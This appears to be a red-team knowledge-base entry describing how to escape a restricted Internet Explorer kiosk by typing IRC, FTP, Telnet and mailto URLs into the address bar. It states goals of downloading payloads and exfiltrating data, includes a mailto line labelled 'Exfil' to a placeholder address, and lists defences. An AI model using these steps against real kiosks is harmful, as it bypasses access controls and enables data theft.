---
id: 0a02e3e7-e6b3-45cd-9788-6718ef775959
name: Browser-Escape-via-Unassociated-Protocols
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:17.464837+00:00'
updated_at: '2024-01-01T00:00:00Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploitation for Client Execution]]'
sub_techniques: []
tags:
  - '[[tags/Application Escape and Breakout]]'
  - '[[tags/Internet Explorer]]'
  - '[[tags/Unassociated Protocols]]'
  - browser-escape
  - sandbox-escape
  - protocol-handlers
commands:
  - '[[commands/browser-enter-http-url]]'
  - '[[commands/browser-enter-https-url]]'
  - '[[commands/browser-enter-irc-url]]'
  - '[[commands/browser-enter-ftp-url]]'
  - '[[commands/browser-enter-telnet-url]]'
  - '[[commands/browser-enter-mailto-url]]'
  - '[[commands/browser-irc-join-channel]]'
platforms:
  - Windows
  - Browser
tools: []
validated: true
---

# Browser-Escape-via-Unassociated-Protocols

## Summary

This procedure demonstrates how to escape a restricted browser environment, such as a kiosk mode in Internet Explorer, by leveraging unassociated or alternate protocols like FTP, IRC, Telnet, and mailto. By entering protocol-specific URLs directly into the browser's address bar, an attacker can invoke external handlers or applications, bypassing web-only restrictions to access the internet, download files, or exfiltrate data.

## Description

In restricted environments like browser-based kiosks, access is often limited to HTTP/HTTPS traffic to prevent unauthorized internet access. However, browsers like Internet Explorer support legacy protocol handlers for FTP, IRC, Telnet, and mailto, which can launch external clients or establish connections outside the sandbox. This technique exploits these handlers to redirect traffic or execute system applications, enabling further actions such as file downloads, remote connections, or sending emails with embedded payloads. It is particularly effective against older Windows systems with IE, where protocol associations are enabled by default. Success depends on the environment not blocking these handlers and the availability of associated client applications. Potential outcomes include achieving command execution via downloaded payloads or pivoting to network resources.

## Requirements

1. Access to a restricted browser session (e.g., kiosk mode in Internet Explorer on Windows).
2. Knowledge of enabled protocol handlers (test via address bar entries).
3. Presence of associated client applications (e.g., FTP client, Telnet, email client) on the target system.
4. No group policy restrictions on protocol invocations.

## Defense

- Disable unnecessary protocol handlers via registry edits or group policy (e.g., block FTP, IRC, Telnet in IE settings).
- Monitor for anomalous process launches from browser contexts (e.g., iexplore.exe spawning ftp.exe or telnet.exe).
- Implement application whitelisting to prevent execution of legacy clients like Telnet or IRC.
- Use modern browsers with sandboxing (e.g., Chrome/Edge) that deprecate or restrict legacy protocols.

## Objectives

1. Bypass browser restrictions to access external network resources.
2. Invoke system applications for file transfer or remote connections.
3. Download and potentially execute malicious payloads from remote servers.
4. Exfiltrate data via email or other channels opened by protocol handlers.

## Instructions

### Step 1: Test HTTP Protocol Access

**Context**: Verify basic web access or use HTTP to attempt breakout if restrictions are partial; this establishes a baseline for protocol handling.

**Command** ([[commands/browser-enter-http-url]]):

Enter the following in the browser address bar:

```
http://example.com
```

> This invokes the default web handler. If successful, it loads the page; otherwise, check for errors indicating restrictions. Expected output: Page loads or connection established.

### Step 2: Switch to HTTPS for Secure Access

**Context**: If HTTP is blocked or monitored, use HTTPS to encrypt traffic and potentially evade filters, allowing access to secure resources.

**Command** ([[commands/browser-enter-https-url]]):

Enter the following in the browser address bar:

```
https://example.com
```

> This attempts a secure connection. Success is indicated by a loaded page with HTTPS lock icon; failures may show certificate warnings or blocks.

### Step 3: Connect via IRC Protocol

**Context**: Use IRC to establish a chat connection, which can be leveraged for command issuance or data exfil if an IRC client launches.

**Command** ([[commands/browser-enter-irc-url]]):

Enter the following in the browser address bar:

```
irc://irc.server.com
```

> This launches the default IRC client if associated. Expected output: IRC client opens and connects to the server.

**Command** ([[commands/browser-irc-join-channel]]):

Once connected, join a channel by entering in the IRC client or via extended URL:

```
irc://irc.server.com/channel
```

> This joins the specified channel. Success: Visible channel messages or user list.

### Step 4: Download Files via FTP

**Context**: Exploit FTP handler to transfer files from a controlled server, potentially downloading payloads for execution.

**Command** ([[commands/browser-enter-ftp-url]]):

Enter the following in the browser address bar:

```
ftps://ftp.example.com/file.txt
```

> This prompts the FTP client to download the file. Expected output: File saved locally or displayed in browser/FTP client.

### Step 5: Establish Telnet Connection

**Context**: Use Telnet to connect to a remote host, enabling interactive shell access if the target has Telnet enabled.

**Command** ([[commands/browser-enter-telnet-url]]):

Enter the following in the browser address bar:

```
telnet://localhost:23
```

> This launches Telnet and connects. Expected output: Telnet prompt or connection banner from the host.

### Step 6: Exfiltrate via Email

**Context**: Invoke the email client to send data, useful for attaching screenshots or logs from the restricted environment.

**Command** ([[commands/browser-enter-mailto-url]]):

Enter the following in the browser address bar:

```
mailto:recipient@example.com?subject=Exfil&body=Data here
```

> This opens the default email client with a composed message. Expected output: Email draft ready to send.
